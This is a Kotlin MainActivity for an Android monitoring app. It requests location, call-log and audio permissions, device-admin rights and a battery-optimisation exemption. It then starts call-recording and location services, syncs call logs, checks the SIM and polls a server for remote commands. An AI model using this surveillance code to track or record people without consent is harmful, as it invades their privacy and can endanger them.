package com.example.location_where

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.activity.enableEdgeToEdge
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import androidx.work.*
import android.view.Menu
import android.view.MenuItem
import com.example.location_where.api.ApiService
import com.example.location_where.data.DeviceRegisterRequest
import com.example.location_where.databinding.ActivityMainBinding
import com.example.location_where.services.CallRecordingService
import com.example.location_where.services.LocationService
import com.example.location_where.utils.TokenManager
import com.example.location_where.workers.CallLogWorker
import com.example.location_where.workers.CommandWorker
import com.example.location_where.workers.LocationSyncWorker
import com.google.firebase.messaging.FirebaseMessaging
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    @Inject
    lateinit var tokenManager: TokenManager

    @Inject
    lateinit var apiService: ApiService

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        if (permissions.all { it.value }) {
            handleBackgroundLocationPermission()
        } else {
            Toast.makeText(this, "Permissions required for monitoring", Toast.LENGTH_LONG).show()
        }
    }

    private val backgroundLocationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (granted) {
            startMonitoringServices()
        } else {
            Toast.makeText(this, "Background location is required for continuous monitoring", Toast.LENGTH_LONG).show()
        }
    }

    private val appSettingsLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (hasBackgroundLocationPermission()) {
            startMonitoringServices()
        } else {
            Toast.makeText(this, "Enable 'Allow all the time' for location in app settings", Toast.LENGTH_LONG).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        ViewCompat.setOnApplyWindowInsetsListener(binding.main) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }
        setSupportActionBar(binding.toolbar)

        binding.fab.setOnClickListener {
            checkPermissionsAndStart()
        }

        setupDashboard()
        registerDevice()
        requestIgnoreBatteryOptimizations()
        requestDeviceAdmin()
    }

    override fun onResume() {
        super.onResume()
        registerDevice()
    }

    private fun requestDeviceAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminName = ComponentName(this, MonitoringDeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(adminName)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This permission is required for remote device management.")
            startActivity(intent)
        }
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent()
            val packageName = packageName
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.action = android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                intent.data = android.net.Uri.parse("package:$packageName")
                startActivity(intent)
            }
        }
    }

    private fun registerDevice() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) return@addOnCompleteListener
            syncDeviceRegistration(task.result)
        }
    }

    private fun syncDeviceRegistration(fcmToken: String?) {
        val request = DeviceRegisterRequest(
            deviceModel = Build.MODEL,
            manufacturer = Build.MANUFACTURER,
            androidVersion = Build.VERSION.RELEASE,
            appVersion = "1.0",
            fcmToken = fcmToken,
            isAdminActive = isDeviceAdminActive()
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                apiService.registerDevice(request)
            } catch (e: Exception) {
                // Log error
            }
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminName = ComponentName(this, MonitoringDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(adminName)
    }

    private fun setupDashboard() {
        val logoutBtn = findViewById<Button>(R.id.logoutBtn)
        logoutBtn?.setOnClickListener {
            showLogoutDialog()
        }
        
        val batteryLevelText = findViewById<TextView>(R.id.batteryLevelText)
        if (batteryLevelText != null) {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            batteryLevelText.text = "$batteryLevel%"
        }
    }

    private fun showLogoutDialog() {
        AlertDialog.Builder(this)
            .setTitle("Sign out")
            .setMessage("Sign out from this device?")
            .setPositiveButton("Logout") { _, _ ->
                performLogout()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun performLogout() {
        CoroutineScope(Dispatchers.Main).launch {
            tokenManager.clearTokens()
            val intent = Intent(this@MainActivity, SplashActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            startActivity(intent)
            finish()
        }
    }

    private fun checkPermissionsAndStart() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missingPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isEmpty()) {
            handleBackgroundLocationPermission()
        } else {
            requestPermissionLauncher.launch(missingPermissions.toTypedArray())
        }
    }

    private fun handleBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q || hasBackgroundLocationPermission()) {
            startMonitoringServices()
            return
        }

        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
            backgroundLocationPermissionLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            return
        }

        AlertDialog.Builder(this)
            .setTitle("Allow all the time")
            .setMessage("Enable background location as 'Allow all the time' so monitoring keeps working when the app is not open.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(
                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:$packageName")
                )
                appSettingsLauncher.launch(intent)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun hasBackgroundLocationPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    private fun startMonitoringServices() {
        val locationIntent = Intent(this, LocationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(locationIntent)
        } else {
            startService(locationIntent)
        }

        val callIntent = Intent(this, CallRecordingService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(callIntent)
        } else {
            startService(callIntent)
        }

        scheduleSimCheck()
        scheduleLocationSync()
        scheduleCallLogSync()
        scheduleCommandPolling()
    }

    private fun scheduleSimCheck() {
        val simCheckRequest = PeriodicWorkRequestBuilder<SimCheckWorker>(1, TimeUnit.HOURS)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "SimCheckWork",
            ExistingPeriodicWorkPolicy.KEEP,
            simCheckRequest
        )
    }

    private fun scheduleLocationSync() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val syncRequest = PeriodicWorkRequestBuilder<LocationSyncWorker>(1, TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "LocationSyncWork",
            ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
    }

    private fun scheduleCallLogSync() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val callLogRequest = PeriodicWorkRequestBuilder<CallLogWorker>(2, TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "CallLogSyncWork",
            ExistingPeriodicWorkPolicy.KEEP,
            callLogRequest
        )
    }

    private fun scheduleCommandPolling() {
        val syncRequest = PeriodicWorkRequestBuilder<CommandWorker>(15, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "CommandPollingWork",
            ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )

        val immediateSyncRequest = OneTimeWorkRequestBuilder<CommandWorker>().build()

        WorkManager.getInstance(this).enqueueUniqueWork(
            "CommandPollingImmediateWork",
            ExistingWorkPolicy.REPLACE,
            immediateSyncRequest
        )
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_settings -> true
            else -> super.onOptionsItemSelected(item)
        }
    }

    override fun onSupportNavigateUp(): Boolean {
        return super.onSupportNavigateUp()
    }
}
